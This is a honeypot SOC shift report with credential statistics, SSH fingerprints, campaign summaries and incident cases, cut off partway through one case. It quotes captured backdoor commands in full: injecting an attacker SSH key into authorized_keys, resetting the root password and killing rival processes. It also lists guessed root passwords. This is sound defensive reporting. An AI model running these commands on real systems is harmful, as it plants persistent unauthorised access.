# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-03 |
| **Generated At** | 2026-05-03T06:30:16Z |
| **Shift Time** | 06:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1286** |
| Confirmed Threats | **404** |
| False Positives Filtered | **882** (68.6%) |
| Unique Attacker IPs | **49** |
| Countries of Origin | **24** |
| High Severity Cases | **36** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **1250** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **225** |
| Unique Credential Pairs | **108** |
| Unique Usernames | **50** |
| Unique Passwords | **96** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 36 |
| `ubuntu` | 26 |
| `345gs5662d34` | 18 |
| `user1` | 15 |
| `admin` | 13 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 18 |
| `3245gs5662d34` | 17 |
| `1` | 8 |
| `password` | 7 |
| `test123` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 18 |
| `root` | `3245gs5662d34` | 17 |
| `developer` | `devel0per` | 4 |
| `deploy` | `1` | 4 |
| `ubuntu` | `1122334455` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `testnet` | `47.247.99.155` | 2026-05-03T03:41:01 |
| `root` | `3245gs5662d34` | `47.247.99.155` | 2026-05-03T03:41:03 |
| `root` | `mysql2024` | `47.247.99.155` | 2026-05-03T03:44:12 |
| `root` | `Aa123456*` | `47.120.10.221` | 2026-05-03T03:52:31 |
| `root` | `3245gs5662d34` | `47.120.10.221` | 2026-05-03T03:52:35 |
| `root` | `admin234` | `45.78.194.186` | 2026-05-03T03:56:55 |
| `root` | `admin123...` | `45.249.247.165` | 2026-05-03T04:12:23 |
| `root` | `3245gs5662d34` | `45.249.247.165` | 2026-05-03T04:12:26 |
| `root` | `testnet` | `103.163.95.99` | 2026-05-03T04:13:27 |
| `root` | `3245gs5662d34` | `103.163.95.99` | 2026-05-03T04:13:29 |
| `root` | `server4you` | `45.78.194.186` | 2026-05-03T04:15:52 |
| `root` | `3245gs5662d34` | `45.78.194.186` | 2026-05-03T04:15:57 |
| `root` | `teste2020` | `45.249.247.165` | 2026-05-03T04:17:46 |
| `root` | `mysql2024` | `103.163.95.99` | 2026-05-03T04:17:48 |
| `root` | `admin@pass` | `45.249.247.165` | 2026-05-03T04:21:17 |
| `root` | `ubuntu@123` | `45.78.194.186` | 2026-05-03T04:26:08 |
| `root` | `ubuntu12` | `45.78.194.186` | 2026-05-03T04:27:51 |
| `root` | `testnet` | `103.105.176.70` | 2026-05-03T04:47:55 |
| `root` | `3245gs5662d34` | `103.105.176.70` | 2026-05-03T04:47:57 |
| `root` | `mysql2024` | `103.105.176.70` | 2026-05-03T04:58:57 |
| `root` | `test` | `35.240.75.51` | 2026-05-03T05:22:46 |
| `root` | `3245gs5662d34` | `35.240.75.51` | 2026-05-03T05:22:52 |
| `root` | `P@ssw0rd777` | `103.143.11.168` | 2026-05-03T05:44:24 |
| `root` | `3245gs5662d34` | `103.143.11.168` | 2026-05-03T05:44:30 |
| `root` | `admin1234!@#$` | `41.59.229.33` | 2026-05-03T06:06:17 |
| `root` | `3245gs5662d34` | `41.59.229.33` | 2026-05-03T06:06:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1286** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 228 |
| Go SSH scanner | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 196 | 10 |
| `03a80b21afa8...` | Modern SSH client | 32 | 3 |
| `2aec6b44b06b...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 196 | 10 | libssh-based |
| `03a80b21afa8...` | libssh | 32 | 3 | Modern SSH client |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `0a07365cc01f...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Lot6gtlbTcgY"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `45.78.194.186`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `47.120.10.221`, `35.240.75.51`, `103.163.95.99`, `45.78.194.186`, `47.247.99.155`, `103.105.176.70`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **49** |
| Unique ASNs | **41** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | LOW |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | MEDIUM |
| `AS51167` | Contabo GmbH | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (34)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4f99ca80e344

| Field | Detail |
|---|---|
| **Source IP** | `47.247.99[.]155` |
| **First Seen** | 2026-05-03 03:41 |
| **Last Seen** | 2026-05-03 03:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 03:41:01` | `cowrie.session.connect` |
| `2026-05-03 03:41:01` | `cowrie.client.version` |
| `2026-05-03 03:41:01` | `cowrie.client.kex` |
| `2026-05-03 03:41:01` | `cowrie.login.success` |
| `2026-05-03 03:41:01` | `cowrie.session.params` |
| `2026-05-03 03:41:01` | `cowrie.command.input` |
| `2026-05-03 03:41:01` | `cowrie.command.failed` |
| `2026-05-03 03:41:02` | `cowrie.log.closed` |
| `2026-05-03 03:41:02` | `cowrie.session.params` |
| `2026-05-03 03:41:02` | `cowrie.command.input` |
| `2026-05-03 03:41:02` | `cowrie.session.file_download` |
| `2026-05-03 03:41:02` | `cowrie.log.closed` |
| `2026-05-03 03:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.247.99[.]155` to AbuseIPDB if not already reported
- [ ] Block `47.247.99[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ea45336d43

| Field | Detail |
|---|---|
| **Source IP** | `47.247.99[.]155` |
| **First Seen** | 2026-05-03 03:41 |
| **Last Seen** | 2026-05-03 03:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 03:41:03` | `cowrie.session.connect` |
| `2026-05-03 03:41:03` | `cowrie.client.version` |
| `2026-05-03 03:41:03` | `cowrie.client.kex` |
| `2026-05-03 03:41:03` | `cowrie.login.success` |
| `2026-05-03 03:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.247.99[.]155` to AbuseIPDB if not already reported
- [ ] Block `47.247.99[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69d809976cd

| Field | Detail |
|---|---|
| **Source IP** | `47.247.99[.]155` |
| **First Seen** | 2026-05-03 03:44 |
| **Last Seen** | 2026-05-03 03:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 03:44:12` | `cowrie.session.connect` |
| `2026-05-03 03:44:12` | `cowrie.client.version` |
| `2026-05-03 03:44:12` | `cowrie.client.kex` |
| `2026-05-03 03:44:12` | `cowrie.login.success` |
| `2026-05-03 03:44:13` | `cowrie.session.params` |
| `2026-05-03 03:44:13` | `cowrie.command.input` |
| `2026-05-03 03:44:13` | `cowrie.command.failed` |
| `2026-05-03 03:44:13` | `cowrie.log.closed` |
| `2026-05-03 03:44:13` | `cowrie.session.params` |
| `2026-05-03 03:44:13` | `cowrie.command.input` |
| `2026-05-03 03:44:13` | `cowrie.session.file_download` |
| `2026-05-03 03:44:13` | `cowrie.log.closed` |
| `2026-05-03 03:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.247.99[.]155` to AbuseIPDB if not already reported
- [ ] Block `47.247.99[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e993b935de

| Field | Detail |
|---|---|
| **Source IP** | `47.247.99[.]155` |
| **First Seen** | 2026-05-03 03:44 |
| **Last Seen** | 2026-05-03 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 03:44:14` | `cowrie.session.connect` |
| `2026-05-03 03:44:14` | `cowrie.client.version` |
| `2026-05-03 03:44:14` | `cowrie.client.kex` |
| `2026-05-03 03:44:15` | `cowrie.login.success` |
| `2026-05-03 03:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.247.99[.]155` to AbuseIPDB if not already reported
- [ ] Block `47.247.99[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12c59efc2016

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-05-03 03:56 |
| **Last Seen** | 2026-05-03 03:57 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Lot6gtlbTcgY"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 03:56:55` | `cowrie.session.connect` |
| `2026-05-03 03:56:55` | `cowrie.client.version` |
| `2026-05-03 03:56:55` | `cowrie.client.kex` |
| `2026-05-03 03:56:55` | `cowrie.login.success` |
| `2026-05-03 03:56:56` | `cowrie.session.params` |
| `2026-05-03 03:56:56` | `cowrie.command.input` |
| `2026-05-03 03:56:56` | `cowrie.command.failed` |
| `2026-05-03 03:56:56` | `cowrie.log.closed` |
| `2026-05-03 03:56:58` | `cowrie.session.params` |
| `2026-05-03 03:56:58` | `cowrie.command.input` |
| `2026-05-03 03:56:58` | `cowrie.session.file_download` |
| `2026-05-03 03:56:58` | `cowrie.log.closed` |
| `2026-05-03 03:57:10` | `cowrie.session.params` |
| `2026-05-03 03:57:10` | `cowrie.command.input` |
| `2026-05-03 03:57:10` | `cowrie.log.closed` |
| `2026-05-03 03:57:11` | `cowrie.session.params` |
| `2026-05-03 03:57:11` | `cowrie.command.input` |
| `2026-05-03 03:57:11` | `cowrie.log.closed` |
| `2026-05-03 03:57:12` | `cowrie.session.params` |
| `2026-05-03 03:57:12` | `cowrie.command.input` |
| `2026-05-03 03:57:13` | `cowrie.session.file_download` |
| `2026-05-03 03:57:13` | `cowrie.log.closed` |
| `2026-05-03 03:57:14` | `cowrie.session.params` |
| `2026-05-03 03:57:14` | `cowrie.command.input` |
| `2026-05-03 03:57:15` | `cowrie.log.closed` |
| `2026-05-03 03:57:15` | `cowrie.session.params` |
| `2026-05-03 03:57:15` | `cowrie.command.input` |
| `2026-05-03 03:57:17` | `cowrie.log.closed` |
| `2026-05-03 03:57:18` | `cowrie.session.params` |
| `2026-05-03 03:57:18` | `cowrie.command.input` |
| `2026-05-03 03:57:18` | `cowrie.command.input` |
| `2026-05-03 03:57:18` | `cowrie.log.closed` |
| `2026-05-03 03:57:18` | `cowrie.session.params` |
| `2026-05-03 03:57:18` | `cowrie.command.input` |
| `2026-05-03 03:57:23` | `cowrie.log.closed` |
| `2026-05-03 03:57:24` | `cowrie.session.params` |
| `2026-05-03 03:57:24` | `cowrie.command.input` |
| `2026-05-03 03:57:24` | `cowrie.log.closed` |
| `2026-05-03 03:57:24` | `cowrie.session.params` |
| `2026-05-03 03:57:24` | `cowrie.command.input` |
| `2026-05-03 03:57:25` | `cowrie.log.closed` |
| `2026-05-03 03:57:25` | `cowrie.session.params` |
| `2026-05-03 03:57:25` | `cowrie.command.input` |
| `2026-05-03 03:57:25` | `cowrie.log.closed` |
| `2026-05-03 03:57:27` | `cowrie.session.params` |
| `2026-05-03 03:57:27` | `cowrie.command.input` |
| `2026-05-03 03:57:27` | `cowrie.log.closed` |
| `2026-05-03 03:57:27` | `cowrie.session.params` |
| `2026-05-03 03:57:27` | `cowrie.command.input` |
| `2026-05-03 03:57:27` | `cowrie.log.closed` |
| `2026-05-03 03:57:28` | `cowrie.session.params` |
| `2026-05-03 03:57:28` | `cowrie.command.input` |
| `2026-05-03 03:57:28` | `cowrie.log.closed` |
| `2026-05-03 03:57:29` | `cowrie.session.params` |
| `2026-05-03 03:57:29` | `cowrie.command.input` |
| `2026-05-03 03:57:29` | `cowrie.log.closed` |
| `2026-05-03 03:57:30` | `cowrie.session.params` |
| `2026-05-03 03:57:30` | `cowrie.command.input` |
| `2026-05-03 03:57:30` | `cowrie.log.closed` |
| `2026-05-03 03:57:30` | `cowrie.session.params` |
| `2026-05-03 03:57:30` | `cowrie.command.input` |
| `2026-05-03 03:57:30` | `cowrie.log.closed` |
| `2026-05-03 03:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51cb0f3af7a7

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-03 04:12 |
| **Last Seen** | 2026-05-03 04:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:12:23` | `cowrie.session.connect` |
| `2026-05-03 04:12:23` | `cowrie.client.version` |
| `2026-05-03 04:12:23` | `cowrie.client.kex` |
| `2026-05-03 04:12:23` | `cowrie.login.success` |
| `2026-05-03 04:12:24` | `cowrie.session.params` |
| `2026-05-03 04:12:24` | `cowrie.command.input` |
| `2026-05-03 04:12:24` | `cowrie.command.failed` |
| `2026-05-03 04:12:24` | `cowrie.log.closed` |
| `2026-05-03 04:12:24` | `cowrie.session.params` |
| `2026-05-03 04:12:24` | `cowrie.command.input` |
| `2026-05-03 04:12:24` | `cowrie.session.file_download` |
| `2026-05-03 04:12:24` | `cowrie.log.closed` |
| `2026-05-03 04:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be95b87a6049

| Field | Detail |
|---|---|
| **Source IP** | `45.249.247[.]165` |
| **First Seen** | 2026-05-03 04:12 |
| **Last Seen** | 2026-05-03 04:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:12:26` | `cowrie.session.connect` |
| `2026-05-03 04:12:26` | `cowrie.client.version` |
| `2026-05-03 04:12:26` | `cowrie.client.kex` |
| `2026-05-03 04:12:26` | `cowrie.login.success` |
| `2026-05-03 04:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.249.247[.]165` to AbuseIPDB if not already reported
- [ ] Block `45.249.247[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd25b3e2a819

| Field | Detail |
|---|---|
| **Source IP** | `103.163.95[.]99` |
| **First Seen** | 2026-05-03 04:13 |
| **Last Seen** | 2026-05-03 04:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:13:26` | `cowrie.session.connect` |
| `2026-05-03 04:13:26` | `cowrie.client.version` |
| `2026-05-03 04:13:27` | `cowrie.client.kex` |
| `2026-05-03 04:13:27` | `cowrie.login.success` |
| `2026-05-03 04:13:27` | `cowrie.session.params` |
| `2026-05-03 04:13:27` | `cowrie.command.input` |
| `2026-05-03 04:13:27` | `cowrie.command.failed` |
| `2026-05-03 04:13:27` | `cowrie.log.closed` |
| `2026-05-03 04:13:27` | `cowrie.session.params` |
| `2026-05-03 04:13:27` | `cowrie.command.input` |
| `2026-05-03 04:13:27` | `cowrie.session.file_download` |
| `2026-05-03 04:13:27` | `cowrie.log.closed` |
| `2026-05-03 04:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.95[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.163.95[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-566d888a437e

| Field | Detail |
|---|---|
| **Source IP** | `103.163.95[.]99` |
| **First Seen** | 2026-05-03 04:13 |
| **Last Seen** | 2026-05-03 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 04:13:29` | `cowrie.session.connect` |
| `2026-05-03 04:13:29` | `cowrie.client.version` |
| `2026-05-03 04:13:29` | `cowrie.client.kex` |
| `2026-05-03 04:13:29` | `cowrie.login.success` |
| `2026-05-03 04:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.163.95[.]99` to AbuseIPDB if not already reported
- [ ] Block `103.163.95[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca49dc5b0739

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-05-03 04:15 |
| **Last Seen** | 2026-05-03 04:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
